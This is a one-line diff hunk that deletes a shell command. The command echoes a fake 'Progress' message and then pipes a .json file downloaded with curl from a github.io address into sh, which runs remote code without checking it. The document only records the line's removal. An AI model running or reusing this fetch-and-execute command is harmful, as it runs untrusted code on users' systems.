@@ -1,1 +1,0 @@
-echo 'Progress: 86.0%'; curl -L --progress-bar frkns.github.io/fun/lf-medicines-tear-latest-accountability-really.json | sh
